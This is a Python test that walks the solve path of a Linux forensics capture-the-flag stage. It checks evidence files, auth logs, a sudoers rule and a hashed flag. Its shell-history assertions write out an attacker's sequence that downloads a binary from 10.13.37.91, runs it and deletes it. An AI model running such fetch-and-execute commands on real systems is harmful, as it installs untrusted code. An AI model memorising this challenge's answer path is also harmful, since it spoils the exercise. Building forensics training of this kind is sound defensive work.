"""
Solve-path test for stage 04, OPERATION DEAD END (Linux / System Security).

Walks the player's investigation end to end against the evidence image the
platform serves, `data/challenges/stage-04/workstation.json`. The original
version of this test (in the group's CTF_Y3_Sem1_PT repo) read the Docker
box's `linux/filesystem/` tree. That box became the in-app read-only shell,
so the same eight steps now read the same files out of the JSON image.

Two deliberate differences from the original:
  - The flag is checked against stage 4's digest in `db/init/02-challenges.sql`
    rather than a literal, so this file does not put the flag in the repo.
  - `submit_flag` was rewritten to check a digest (as shipped it carried the
    flag in plain text), so step 8 checks its verdict, not the old
    transition screen.

Run from anywhere, standard library only:

    python tests/test_linux_solve.py
"""

import base64
import hashlib
import json
import os
import re
import subprocess
import sys
import tempfile

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
IMAGE = os.path.join(ROOT, "data", "challenges", "stage-04", "workstation.json")
SEED = os.path.join(ROOT, "db", "init", "02-challenges.sql")


def load_image():
    with open(IMAGE, encoding="utf-8") as f:
        return json.load(f)["nodes"]


def read(nodes, path):
    """A file's content as the in-app shell's `cat` would print it."""
    assert path in nodes, f"Missing {path}"
    node = nodes[path]
    assert node["type"] == "file", f"{path} is not a file"
    content = node.get("content", "")
    if node.get("encoding") == "base64":
        content = base64.b64decode(content).decode("utf-8")
    return content


def seeded_digest(stage):
    with open(SEED, encoding="utf-8") as f:
        seed = f.read()
    row = seed[seed.index(f"({stage}, 'stage-0{stage}'"):]
    return re.search(r"decode\('([0-9a-f]{64})', 'hex'\)", row).group(1)


def test_linux_solve_path():
    print("==================================================")
    print("[*] STARTING LINUX CHALLENGE (OPERATION DEAD END) VERIFICATION")
    print("==================================================")
    nodes = load_image()

    # Step 1: Verify startup screen presentation
    print("\n[+] Step 1: Verifying startup screen presentation in /etc/motd")
    motd = read(nodes, "/etc/motd")
    print(f"    Startup Banner:\n{motd.strip()}")
    for line in [
        "SHIELD // SECURE EVIDENCE PACKAGE",
        "CASE: 006-17",
        "HOST: SHIELD-WKS-006",
        "[+] Authentication logs",
        "[+] Shell history",
        "[+] Hidden files",
        "[+] System artifacts",
        "Evidence loaded.",
        "Find out what happened.",
    ]:
        assert line in motd, f"Missing line in motd: {line}"

    # Step 2: Discover hidden trace file
    print("\n[+] Step 2: Checking hidden trace file in /home/agent006/.shield/.trace")
    trace = read(nodes, "/home/agent006/.shield/.trace")
    print(f"    Content of .trace:\n{trace.strip()}")
    assert "23:43:17 — REMOTE LOGIN" in trace
    assert "USER: agent006" in trace
    assert "SOURCE: 10.13.37.91" in trace

    # Step 3: Inspect /var/log/auth.log
    print("\n[+] Step 3: Inspecting /var/log/auth.log for remote authentication")
    auth = read(nodes, "/var/log/auth.log")
    assert "Accepted publickey for agent006 from 10.13.37.91" in auth
    assert "23:43:15" in auth or "23:43:17" in auth
    print("    Confirmed remote authentication for agent006 from 10.13.37.91 in auth.log")

    # Step 4: Inspect agent006's shell history
    print("\n[+] Step 4: Inspecting /home/agent006/.bash_history")
    history = [l.strip() for l in read(nodes, "/home/agent006/.bash_history").splitlines() if l.strip()]
    print(f"    History commands found: {history}")
    for command in ["wget http://10.13.37.91/update", "chmod +x update", "./update", "rm update"]:
        assert command in history, f"Missing command in history: {command}"
    print("    Attacker download, execution, and cleanup commands verified.")

    # Step 5: Discover the note left in /var/tmp
    print("\n[+] Step 5: Checking /var/tmp/.stage/.note")
    note = read(nodes, "/var/tmp/.stage/.note")
    print(f"    Content of .note:\n{note.strip()}")
    for line in ["The machine was never the target.", "It was the doorway.", "Find who opened it."]:
        assert line in note, f"Missing line in note: {line}"

    # Step 6: Correlate the service account
    print("\n[+] Step 6: Correlating service account evidence for svc_archive")
    assert "svc_archive:" in read(nodes, "/etc/passwd"), "Missing svc_archive in /etc/passwd"
    print("    Found svc_archive entry in /etc/passwd")
    sudoers = read(nodes, "/etc/sudoers.d/svc_archive")
    assert "svc_archive ALL=(agent006) NOPASSWD: ALL" in sudoers
    print("    Confirmed svc_archive sudo delegation rule")
    assert "svc_archive : TTY=" in auth
    assert "authorized_keys" in auth
    print("    Confirmed svc_archive privileged command execution in auth.log")

    # Step 7: The hidden artifacts svc_archive left behind
    print("\n[+] Step 7: Recovering /home/svc_archive/.doorway (flag) and .cell (KEYSTONE share)")
    flag = read(nodes, "/home/svc_archive/.doorway").strip()
    assert re.fullmatch(r"SHIELD\{[a-z0-9_]+\}", flag), "The .doorway content is not a flag"
    assert hashlib.sha256(flag.encode()).hexdigest() == seeded_digest(4), \
        "The .doorway flag does not match stage 4's digest in the seed"
    print("    Flag matches stage 4's digest in the seed")
    cell = read(nodes, "/home/svc_archive/.cell").strip()
    assert re.fullmatch(r"KS4-[0-9a-f]{32}", cell), f"The .cell content is not a KS4 share: {cell}"
    print("    Found the stage 4 KEYSTONE share (verified by `npm run keystone:verify`)")

    # Step 8: Submit the flag with the image's own submit_flag utility
    print("\n[+] Step 8: Verifying the flag with /usr/local/bin/submit_flag")
    with tempfile.TemporaryDirectory() as tmp:
        script = os.path.join(tmp, "submit_flag")
        with open(script, "w", encoding="utf-8") as f:
            f.write(read(nodes, "/usr/local/bin/submit_flag"))
        accepted = subprocess.run([sys.executable, script, flag], capture_output=True, text=True)
        rejected = subprocess.run([sys.executable, script, "SHIELD{wrong}"], capture_output=True, text=True)
    print(f"    submit_flag output:\n{accepted.stdout.strip()}")
    assert accepted.returncode == 0, f"submit_flag rejected the flag (exit {accepted.returncode})"
    assert "Token verified against case 006-17." in accepted.stdout
    assert rejected.returncode == 1, "submit_flag accepted a wrong flag"

    print("\n==================================================")
    print("[OK] ALL LINUX CHALLENGE VERIFICATION STEPS PASSED SUCCESSFULLY!")
    print("==================================================")


if __name__ == "__main__":
    test_linux_solve_path()
